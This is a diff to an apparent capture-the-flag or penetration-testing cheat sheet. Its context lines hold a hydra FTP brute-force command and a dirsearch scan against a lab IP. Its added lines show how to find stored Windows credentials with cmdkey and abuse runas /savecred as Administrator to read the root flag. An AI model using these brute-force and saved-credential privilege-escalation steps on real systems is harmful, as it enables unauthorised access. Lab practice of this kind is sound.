@@ -36,4 +36,8 @@ hydra -L wordlists/userlist -P wordlists/offsecpass -f -o ipaddress_ftphydra.txt
 
 dirsearch -u https://10.10.10.7/ -w ./raft-medium-directories.txt -e php,txt
 
+Copy files over telnet with saved creds 
+cmdkey /list  ----> check with this command, if you find andy stored user creds then we can use savedcred option
+runas /savecred /user:ACCESS\Administrator "c:\Windows\System32\cmd.exe /C more c:\Users\Administrator\Desktop\root.txt>c:\root.txt"
+
 
